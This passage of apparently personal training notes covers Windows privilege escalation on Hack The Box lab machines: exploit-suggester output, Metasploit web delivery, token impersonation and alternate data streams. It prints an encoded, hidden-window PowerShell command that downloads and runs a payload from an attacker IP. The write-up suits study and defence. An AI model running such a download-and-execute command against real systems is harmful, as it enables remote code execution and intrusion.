                           [05]: KB4021702
                           [06]: KB4022633
                           [07]: KB4033631
                           [08]: KB4035632
                           [09]: KB4051613
                           [10]: KB4041689
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.63
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

#### windows-explot suggester python3
- https://github.com/aysebilgegunduz/Windows-Exploit-Suggester/blob/pr_version/windows-exploit-suggester.py

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/175.jpg)

xlrd error
https://stackoverflow.com/questions/65254535/xlrd-biffh-xlrderror-excel-xlsx-file-not-supported/65255334#65255334

``` py
python3 windows-exploit-suggester.py --database 2021-07-10-mssb.xls --systeminfo sysinfo.txt
```

```py
python3 windows-exploit-suggester.py --database 2021-07-10-mssb.xls --systeminfo /home/kali/Desktop/jeeves/sysinfo.txt
```

```bash
[+]
windows version identified as 'Windows 10 64-bit'
[*]

[E]
MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]
  https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]
  https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]
  https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*]


[E]
MS16-129: Cumulative Security Update for Microsoft Edge (3199057) - Critical
[*]
  https://www.exploit-db.com/exploits/40990/ -- Microsoft Edge (Windows 10) - 'chakra.dll' Info Leak / Type Confusion Remote Code Execution
[*]
  https://github.com/theori-io/chakra-2016-11
[*]



[E]
MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]
  https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*]


[M]
MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]
  https://github.com/foxglovesec/RottenPotato
[*]
  https://github.com/Kevin-Robertson/Tater
[*]
  https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]
  https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]


[E]
MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]
  https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]
  https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*]



[E]
MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]
  https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*]



[E]
MS16-056: Security Update for Windows Journal (3156761) - Critical
[*]
  https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)
[*]
  http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption
[*]



[E]
MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]
  https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]
  https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]
  https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]
  https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*]



[M]
MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]
  https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]
  https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]
  https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*]



[E]
MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]
  Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*]



[E]
MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]
  https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]
  https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*]



[E]
MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]
  https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]
  https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*]



[E]
MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]
  https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*]

[E]
MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]
  https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*]



[E]
MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]
  https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]
  https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]
  https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*]



[E]
MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]
  https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]
  https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*]


[*]
done

```

```
[M]
MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]
  https://github.com/foxglovesec/RottenPotato
[*]
  https://github.com/Kevin-Robertson/Tater
[*]
  https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]
  https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]

```

- this is potato attack so we use metaspolit this is easy way to do it.

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/176.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/177.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/178.jpg)

#### Web delivery script

Metasploit’s [Web Delivery Script](https://www.rapid7.com/db/modules/exploit/multi/script/web_delivery) is a versatile module that creates a server on the attacking machine which hosts a payload. When the victim connects to the attacking server, the payload will be executed on the victim machine.

This exploit requires a method of executing commands on the victim machine. In particular you must be able to reach the attacking machine from the victim. Remote command execution is a great example of an attack vector where using this module is possible. The web delivery script works on php, python, and powershell based applications.

This exploit becomes a very useful tool when the attacker has some control of the system, but does not possess a full shell. In addition, since the server and payload are both on the attacking machine, the attack proceeds without being written to disk. This helps keep the attacking fingerprint low.


![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/179.jpg)

- go for powershell ; It is give a powershell command for us to run

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/180.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/181.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/182.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/183.jpg)

- this specified in the attack
```
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABUAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAFQALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABUAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMgA0ADEAOgA4ADAAOAAwAC8AYwBnAE0AcwBlAG0ARgAvAHEANwBJAFoARAB1ADEAZwB0AHAAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADIANAAxADoAOAAwADgAMAAvAGMAZwBNAHMAZQBtAEYAJwApACkAOwA=
```

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/184.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/185.jpg)


![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/186.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/187.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/188.jpg)

```bash
[*] 10.10.10.63 - 38 exploit checks are being tried...
[+] 10.10.10.63 - exploit/windows/local/bits_ntlm_token_impersonation: The target appears to be vulnerable.
[+] 10.10.10.63 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.63 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
[+] 10.10.10.63 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[-] 10.10.10.63 - Post failed: NoMethodError undefined method `reverse!' for nil:NilClass
[-] 10.10.10.63 - Call stack:
[-] 10.10.10.63 -   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:136:in `shell_command_token_win32'
[-] 10.10.10.63 -   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:84:in `shell_command_token'
[-] 10.10.10.63 -   /usr/share/metasploit-framework/modules/exploits/windows/local/cve_2020_0787_bits_arbitrary_file_move.rb:96:in `check'
[-] 10.10.10.63 -   /usr/share/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:121:in `block in run'
[-] 10.10.10.63 -   /usr/share/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:119:in `each'
[-] 10.10.10.63 -   /usr/share/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:119:in `run'
```

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/189.jpg)


## Escalation via a Potato attack

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/190.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/191.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/192.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/193.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/194.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/195.jpg)

#### Incognito
**Incognito** was originally a stand-alone application that allowed you to impersonate user tokens when successfully compromising a system. ... They are a temporary key that allows you to access the system and network without having to provide credentials each time you access a file.

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/196.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/197.jpg)


## Alternate Data Streams

https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/


### What are Alternate Data Streams?

Alternate Data Streams (ADS) are a file attribute only found on the [NTFS file system](https://technet.microsoft.com/en-us/library/cc781134(v=ws.10).aspx).

In this system a file is built up from a couple of attributes, one of them is _$Data_, aka the data attribute. Looking at the regular data stream of a text file there is no mystery. It simply contains the text inside the text file. But that is only the primary data stream.

This one is sometimes referred to as the unnamed data stream since the name string of this attribute is empty ( “” ) . So any data stream that has a name is considered alternate.

These data streams suffer from a bad reputation since they have been used and abused to write hidden data. Varying from data about where a file came from to complete malware files (e.g. [Backdoor.Rustock.A](https://www.symantec.com/security_response/writeup.jsp?docid=2006-060111-5747-99&tabid=2))

If you are up for an experiment, we can easily create and read an alternate data stream.

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/198.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/199.jpg)

## Escalation Path get System

### In built tool in meterpreter for impersonation

- Tried to elevate the system in few different ways
- two different pips of impersonation
- tries token duplication

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/200.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/201.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/202.jpg)

- 2nd feature caught by antivirus ; drops a dll to the disk and schedule run.
- 3rd SeDebugPrivileges should be enabled

## 15_Escalation Path RunAs

### Run as
![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/203.jpg)

- allow us to run as somebody else
- Hack the Box Access 10.10.10.98

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/204.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/205.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/206.jpg)

- ftp login ;
- username=annonymous,password=annonymous
